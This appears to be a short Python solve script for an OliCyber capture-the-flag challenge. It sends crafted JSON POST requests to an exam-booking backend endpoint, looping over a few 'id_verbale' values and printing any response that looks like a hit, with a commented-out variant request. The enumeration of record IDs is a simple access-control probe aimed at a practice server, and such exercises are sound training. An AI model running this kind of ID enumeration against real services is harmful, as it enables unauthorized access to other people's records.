import requests
from pwn import *
url = "http://exambooking.challs.olicyber.it/bakand"

l = log.progress("Sending requests")

s = requests.Session()

for i in range (530, 533):
    l.status(f"Sending request {i}")
    jsonData = {"id_verbale": i,
            "cod_ins":"01ELEET",
            "data_appello":"2021-07-05",
            "docente":"ROBOT MR"
    }

    r = s.post(url, json=jsonData)
    if ('id' not in r.text or 'ptm' in r.text):
        print(r.text)
        break

# jsonData = {"id_verbale": 999,
#         "cod_ins":"<3CYCL3S",
#         "data_appello":"2021-07-14",
#         "docente":"CEFFO BRUTTO"
# }

# cookie = "/="

# r = requests.post(url, json=jsonData)
# print(r.text)